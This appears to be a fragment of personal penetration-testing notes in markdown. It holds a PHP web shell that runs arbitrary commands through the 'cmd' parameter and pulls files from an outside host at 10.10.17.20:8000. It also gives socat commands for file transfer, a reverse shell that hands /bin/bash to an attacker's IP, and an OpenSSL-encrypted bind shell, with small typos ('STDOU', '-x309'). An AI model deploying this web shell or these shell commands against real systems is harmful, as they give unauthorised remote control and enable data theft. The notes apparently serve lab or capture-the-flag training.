- RCE and RFI via PHP 
  ```php
    <?php 
      if (isset($_REQUEST['fupload'])) {
        file_put_contents($_REQUEST['fupload'], file_get_contents("http://10.10.17.20:8000/" . $_REQUEST['fupload']));
      }
      if (isset($_REQUEST['cmd'])){
        echo system($_REQUEST["cmd"]);
      }	
    ?>
  ```
- mkt script, to create a pentesting folder environment
  ```bash
    #!/bin/bash
    if [[ $# -eq 1 ]]; then
      mkdir -p $1/{nmap,content,exploits,scripts}
      exit 0
    else
      echo "The name of the folder is needed"
      exit 1
    fi
  ```
<br>

## Socat

### Client
  ```bash
  socat - TCP4:>remote server's IP>:80
  ```
### Server
  ```bash
  sudo socat TCP4-LISTEN:443 STDOU
  ```
### Send a file
  ```bash
  sudo socat TCP4-LISTEN:443,fork file:pass.txt
  ```
  
### Receive a file
  ```bash
  sudo socat TCP4:<Server IP>:443 file:pass.txt,create
  ```
### Reverse Shell
  ```bash
  #Attacker's machine
  socat -d -d TCP4-LISTEN:443 STDOUT
  #The -d -d are used to add verbosity
  ```
  
  ```bash
  #Victim's machine
  socat TCP:<Attacker's IP>:443 EXEC:/bin/bash
  ```
  
  ### Encrypted Bind Shells
  We will use **openssl** to create a self-signed cert with the following options:
  * **req**
  * **-newkey**
  * **rsa:2048**
  * **-nodes**
  * **-keyout**
  * **-x309**
  * **-days**
  * **-out**
    ```bash
     openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out shell.crt
     ```
     ```bash
     cat shell.key shell.crt > shell.pem
     ```
     <br>
     
     ```bash
     Victim's machine
     sudo socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0,fork EXEC:/bin/bash
     ```
     ```bash
     Attacker's machine
     socat - OPENSSL:<Victim's IP>:443,verify=0
     ```
  
  

  
